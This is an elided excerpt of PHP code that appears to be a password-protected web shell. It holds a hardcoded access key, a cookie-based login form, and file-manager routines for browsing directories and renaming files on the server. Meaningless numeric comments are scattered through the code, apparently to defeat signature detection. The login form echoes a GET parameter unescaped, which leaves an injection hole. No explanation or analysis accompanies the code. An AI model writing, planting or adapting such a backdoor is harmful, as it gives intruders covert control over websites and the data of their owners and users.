...
$auth_key = "7a69e2bea595976241ba707025a97dcc";
...
$pass = false;
if (isset($_COOKIE['pw_name_35259'])) {
    if(($_COOKIE['pw_name_35259']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_35259'])) {
        if(($_POST['pw_name_35259']) == $auth_key) {
            setcookie("pw_name_35259", $_POST['pw_name_35259']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_35259' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1722318490245557 1722318490575808 1722318490824623 1722318490794823
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1722318490245557 1722318490575808 1722318490824623 1722318490794823
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1722318490245557 1722318490575808 1722318490824623 1722318490794823
            $name = PATH . "/" . $_GET['r'];
